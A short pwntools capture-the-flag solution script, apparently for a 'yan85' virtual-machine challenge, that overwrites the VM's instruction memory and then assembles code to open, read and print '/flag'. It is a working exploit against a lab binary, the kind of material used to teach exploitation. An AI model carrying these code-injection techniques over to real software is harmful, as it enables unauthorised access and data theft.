from pwn import *
from yan85_asm import assemble

p = process("./toddlerone-level-9-0")

# first set of 4 instructions will just be junk cuz ip will already be at 5th
yancode_stage2 = """
IMM a, 1
IMM b, 0x00
IMM c, 0x10
SYS 0x10, a

IMM a, 1
IMM b, 0x00
IMM c, 0x10
SYS 0x10, a

IMM a, 1
IMM b, 0
IMM c, 0
SYS 0x01, a
"""

yancode_stage2 = """
IMM a, 1
IMM b, 0x00
IMM c, 0x10
SYS 0x10 a

IMM d 0x2f
IMM b 0x00
STM b d

IMM d 0x66
IMM b 0x01
STM b d

IMM d 0x6c
IMM b 0x02
STM b d

IMM d 0x61
IMM b 0x03
STM b d

IMM d 0x67
IMM b 0x04
STM b d

IMM d 0x00
IMM b 0x05
STM b d

IMM a 0x00
IMM b 0x00
SYS 0x20, a

IMM c 0x64
SYS 0x08, c

IMM a 0x01
SYS 0x10, c

IMM a 0x00
SYS 0x01, a
"""

# We will overwrite the instructions in the memory
yancode_stage1 = """
IMM a, 0
IMM b, 0xFF
IMM c, 0xFF
SYS 0x8, a
"""

code = assemble(yancode_stage1, order_str='arg1,op,arg2')

print(p.clean())

payload = b""
payload += code

p.send(payload)

print(p.clean())

code = assemble(yancode_stage2, order_str='arg1,op,arg2')

payload = b""
payload += b"\x90" * 1 # alignment
payload += code

p.send(payload)

print(p.clean())

p.close()
